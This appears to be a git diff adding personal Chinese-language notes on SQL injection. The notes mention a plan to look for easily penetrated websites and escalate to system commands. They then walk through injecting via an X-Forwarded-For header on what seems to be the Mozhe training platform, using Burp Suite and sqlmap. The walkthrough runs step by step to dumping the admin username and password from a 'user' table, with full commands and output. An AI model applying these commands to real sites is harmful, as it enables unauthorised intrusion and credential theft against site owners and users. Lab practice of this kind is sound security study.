@@ -1,0 +1,38 @@
+先使用fiddler获取host和参数 然后写py脚本来测试访问
+准备执行sql注入 --失败！
+先找寻可以简单渗透的网站 之后sql注入成功后将尝试sql执行系统命令
+
+
+简单渗透的网站 ： 
+
+
+
+墨者网站的sqlmap： 
+1.使用burp Suite 抓取包  添加 X-Forwarded-For:127.0.0.1*  尝试能否获取返回提示为127.0.0.1  如果能 则保存 发出的post 为 xff.txt文件 
+2.使用sqlmap 以下命令来获取：
+    1. python sqlmap.py -r xff.txt --dbs --batch  // 尝试获取数据库
+        结果 ： available databases [2]:
+                [*] information_schema
+                [*] webcalendar
+    2. python sqlmap.py -r xff.txt -D webcalendar --tables --batch  // 尝试获取数据表
+        结果 ： [2 tables]
+                +--------+
+                | user   |
+                | logins |
+                +--------+
+    3. python sqlmap.py -r xff.txt -d webcalendar -t user --columns --batch  // 尝试获取表中字段
+        结果 ： [3 columns]
+                +----------+-------------+
+                | Column   | Type        |
+                +----------+-------------+
+                | id       | int(11)     |
+                | password | varchar(50) |
+                | username | varchar(50) |
+                +----------+-------------+
+    4. python sqlmap.py -r xff.txt -D webcalendar -T user -C username,password --dump --batch  // 尝试获取表中对应字段数据
+        结果 ： [1 entry]
+                +----------+-----------+
+                | username | password  |
+                +----------+-----------+
+                | admin    | 621213268 |
+                +----------+-----------+
